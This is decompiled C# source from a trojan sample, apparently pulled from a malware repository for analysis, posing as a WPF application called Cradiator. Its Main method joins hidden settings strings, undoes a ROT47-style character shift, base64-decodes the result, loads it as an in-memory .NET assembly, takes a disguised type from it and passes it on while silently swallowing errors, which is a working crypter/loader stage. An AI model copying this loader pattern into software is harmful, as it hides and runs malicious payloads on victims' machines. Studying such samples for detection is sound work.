// Decompiled with JetBrains decompiler
// Type: Cradiator.App.CradiatorApp
// Assembly: EvidenceTypeDescript, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B50F5F07-D63E-4094-B80D-E78774C87D41
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan.MSIL.Crypt.gen-c59c8e3be7ec42553ff6af2588e3bcd0569e9467dbb9307218fb8724e02739f2.exe

using Cradiator.Properties;
using System;
using System.Reflection;
using System.Windows;

namespace Cradiator.App
{
  public class CradiatorApp : Application
  {
    private static Type Shelton;

    [STAThread]
    public static void Main()
    {
      try
      {
        string str = Settings.Default.User + Settings.Default.App + Settings.Default.Offline + Settings.Default.Service;
        char[] charArray = str.ToCharArray();
        for (int index = 0; index < str.Length; ++index)
        {
          if (Convert.ToInt32(charArray[index]) >= 33 && Convert.ToInt32(charArray[index]) <= 126)
            charArray[index] = Convert.ToChar(33 + ((int) charArray[index] + 14) % 94);
        }
        CradiatorApp.Springfield(CradiatorApp.Castillo(new string(charArray)), "");
        NotifyingClass.kop(CradiatorApp.Shelton);
        new CradiatorApp().Run();
      }
      catch (Exception ex)
      {
      }
    }

    private static void Springfield(byte[] Level, string po) => CradiatorApp.Barbara(CradiatorApp.Prien(Level));

    private static byte[] Castillo(string Lop) => Convert.FromBase64String(Lop);

    private static Assembly Prien(byte[] Position) => AppDomain.CurrentDomain.Load(Position);

    private static void Barbara(Assembly TargetSite) => CradiatorApp.Shelton = TargetSite.GetType("SharpStructures.Sorting.SortHelper");
  }
}
